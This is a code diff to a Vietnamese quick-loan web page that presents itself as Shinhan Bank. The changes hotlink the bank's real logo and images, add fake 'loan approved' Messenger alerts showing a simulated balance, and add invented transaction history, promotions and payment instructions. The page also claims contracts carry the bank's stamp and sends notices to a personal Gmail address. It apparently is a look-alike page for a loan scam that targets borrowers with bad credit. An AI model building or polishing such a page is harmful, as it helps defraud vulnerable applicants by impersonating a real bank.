@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Shinhan Bank - Vay Nhanh</title>
-    <link rel="icon" href="shinhan-favicon.ico">
+    <link rel="icon" href="https://www.shinhan.com.vn/favicon.ico">
     <style>
         * {
             margin: 0;
@@ -654,8 +654,14 @@
                         <p><strong>Đại diện Shinhan Bank:</strong> [Chữ ký và con dấu]</p>
                     `;
 
+                    // Notifications
                     alert('Email gửi đến ThuyTrangEly318@gmail.com: "Đăng ký vay thành công. Vui lòng kiểm tra hợp đồng trong hệ thống."');
                     alert('SMS: "Shinhan Bank: Đăng ký vay thành công. Kiểm tra hợp đồng tại website."');
+
+                    // Messenger Notification
+                    const balance = loanAmount; // Giả lập số dư = số tiền vay
+                    alert(`Messenger: "Shinhan Bank: Hồ sơ vay của bạn đã được duyệt. Số dư tài khoản: ${balance} VNĐ."`);
+                    window.open('https://m.me/ShinhanBankVietnam', '_blank'); // Mở Messenger
                 }, 2000);
             });
 
@@ -675,6 +681,11 @@
             chatButton.addEventListener('click', () => {
                 alert('Chức năng chat đang được phát triển. Vui lòng gọi hotline 1900 1577 để được hỗ trợ!');
             });
+
+            const messengerButton = document.querySelector('.support-btn.messenger');
+            messengerButton.addEventListener('click', () => {
+                window.open('https://m.me/ShinhanBankVietnam', '_blank');
+            });
         });
     </script>
 </head>
@@ -682,7 +693,7 @@
     <!-- Header -->
     <header>
         <div class="logo">
-            <img src="shinhan-bank-logo.png" alt="Shinhan Bank Logo">
+            <img src="https://www.shinhan.com.vn/images/logo.png" alt="Shinhan Bank Logo">
         </div>
         <button class="hamburger">☰</button>
         <nav>
@@ -707,13 +718,13 @@
             <p>Sở hữu nguồn vốn mơ ước với lãi suất thấp, chi phí rõ ràng, đặc biệt hỗ trợ khách hàng có nợ xấu!</p>
             <button onclick="document.querySelector('#register-form .section-toggle').click()">TÌM HIỂU THÊM</button>
         </div>
-        <img src="banner-image.jpg" alt="Banner Image" loading="lazy">
+        <img src="https://www.shinhan.com.vn/images/banner-vay-tieu-dung.jpg" alt="Banner Image" loading="lazy">
     </section>
 
     <!-- Categories -->
     <section class="categories">
         <div class="category-card">
-            <img src="personal-icon.jpg" alt="Cá Nhân" loading="lazy">
+            <img src="https://www.shinhan.com.vn/images/personal-icon.jpg" alt="Cá Nhân" loading="lazy">
             <h4>CÁ NHÂN</h4>
             <div class="sub-items">
                 <a href="#loan-packages">Khoản Vay Tiêu Dùng</a>
@@ -722,7 +733,7 @@
             </div>
         </div>
         <div class="category-card">
-            <img src="business-icon.jpg" alt="Doanh Nghiệp" loading="lazy">
+            <img src="https://www.shinhan.com.vn/images/business-icon.jpg" alt="Doanh Nghiệp" loading="lazy">
             <h4>DOANH NGHIỆP</h4>
             <div class="sub-items">
                 <a href="#">Vay Vốn Kinh Doanh</a>
@@ -731,7 +742,7 @@
             </div>
         </div>
         <div class="category-card">
-            <img src="card-icon.jpg" alt="Thẻ" loading="lazy">
+            <img src="https://www.shinhan.com.vn/images/card-icon.jpg" alt="Thẻ" loading="lazy">
             <h4>THẺ</h4>
             <div class="sub-items">
                 <a href="#">Thẻ Tín Dụng</a>
@@ -750,7 +761,7 @@
         </div>
         <div class="section-content">
             <div class="loan-card">
-                <img src="car-icon.png" alt="Car" loading="lazy">
+                <img src="https://www.shinhan.com.vn/images/car-icon.png" alt="Car" loading="lazy">
                 <div>
                     <h4>Vay Mua Xe</h4>
                     <p>Lãi suất từ 6.5%/năm, hạn mức 500M</p>
@@ -761,7 +772,7 @@
                 </div>
             </div>
             <div class="loan-card">
-                <img src="house-icon.png" alt="House" loading="lazy">
+                <img src="https://www.shinhan.com.vn/images/house-icon.png" alt="House" loading="lazy">
                 <div>
                     <h4>Vay Mua Nhà</h4>
                     <p>Lãi suất từ 7%/năm, hạn mức 2T</p>
@@ -772,7 +783,7 @@
                 </div>
             </div>
             <div class="loan-card">
-                <img src="cash-icon.png" alt="Cash" loading="lazy">
+                <img src="https://www.shinhan.com.vn/images/cash-icon.png" alt="Cash" loading="lazy">
                 <div>
                     <h4>Vay Tín Chấp</h4>
                     <p>Lãi suất từ 8%/năm, hạn mức 300M</p>
@@ -783,7 +794,7 @@
                 </div>
             </div>
             <div class="loan-card">
-                <img src="repair-icon.png" alt="Repair" loading="lazy">
+                <img src="https://www.shinhan.com.vn/images/repair-icon.png" alt="Repair" loading="lazy">
                 <div>
                     <h4>Vay Sửa Nhà</h4>
                     <p>Lãi suất từ 7.5%/năm, hạn mức 200M</p>
@@ -916,6 +927,40 @@
             <input type="text" placeholder="Mục đích vay">
             <button>Gửi Đăng Ký</button>
         </div>
+
+        <!-- Transaction History -->
+        <div class="section-toggle" id="transaction-history">
+            <h3>Lịch Sử Giao Dịch</h3>
+            <span class="arrow">▼</span>
+        </div>
+        <div class="section-content">
+            <p>Tra cứu lịch sử giao dịch tài khoản vay của bạn.</p>
+            <table>
+                <tr><th>Ngày</th><th>Giao dịch</th><th>Số tiền</th></tr>
+                <tr><td>01/04/2025</td><td>Giải ngân</td><td>50,000,000 VNĐ</td></tr>
+            </table>
+        </div>
+
+        <!-- Promotions -->
+        <div class="section-toggle" id="promotions">
+            <h3>Ưu Đãi Hiện Tại</h3>
+            <span class="arrow">▼</span>
+        </div>
+        <div class="section-content">
+            <p>Miễn phí tất toán trước hạn từ năm thứ 4 trở đi.</p>
+            <p>Giảm 0.5% lãi suất cho khách hàng đăng ký trong tháng này.</p>
+        </div>
+
+        <!-- Payment Guide -->
+        <div class="section-toggle" id="payment-guide">
+            <h3>Hướng Dẫn Thanh Toán</h3>
+            <span class="arrow">▼</span>
+        </div>
+        <div class="section-content">
+            <p>- Chuyển khoản qua Internet Banking Shinhan.</p>
+            <p>- Thanh toán qua ví điện tử (MoMo, ZaloPay).</p>
+            <p>- Thanh toán trực tiếp tại quầy giao dịch Shinhan Bank.</p>
+        </div>
     </section>
 
     <!-- Contract Display -->
@@ -923,19 +968,22 @@
         <h2>Hợp Đồng Đăng Ký Vay</h2>
         <p>Hồ sơ của bạn đã được xác nhận với con dấu Shinhan Bank.</p>
         <div id="contract-content"></div>
-        <img src="contract-stamped.jpg" alt="Hợp đồng có con dấu" loading="lazy">
+        <img src="https://www.shinhan.com.vn/images/contract-stamped.jpg" alt="Hợp đồng có con dấu" loading="lazy">
     </section>
 
     <!-- Loan Intro -->
     <section class="loan-intro">
         <h2>Giới Thiệu Khoản Vay</h2>
         <p>Vay dễ dàng, không thế chấp, duyệt nhanh trong 60 giây. Hỗ trợ khách hàng có nợ xấu/nợ chú ý, vay tối đa 50 triệu.</p>
+        <h3>Điều kiện giải ngân:</h3>
+        <p>- Độ tuổi: Nam 21-58, nữ 21-55.<br>- Thu nhập tối thiểu: 4 triệu VNĐ/tháng.<br>- Có CCCD gắn chip.<br>- Hồ sơ phê duyệt trong 15 phút, giải ngân trong 48 giờ sau khi ký hợp đồng online.</p>
     </section>
 
     <!-- Support Buttons -->
     <div class="support-buttons">
         <button class="support-btn call" title="Gọi Hotline">📞</button>
         <button class="support-btn chat" title="Chat Trực Tiếp">💬</button>
+        <button class="support-btn messenger" title="Nhắn Tin qua Messenger">📩</button>
     </div>
 
     <!-- Footer -->
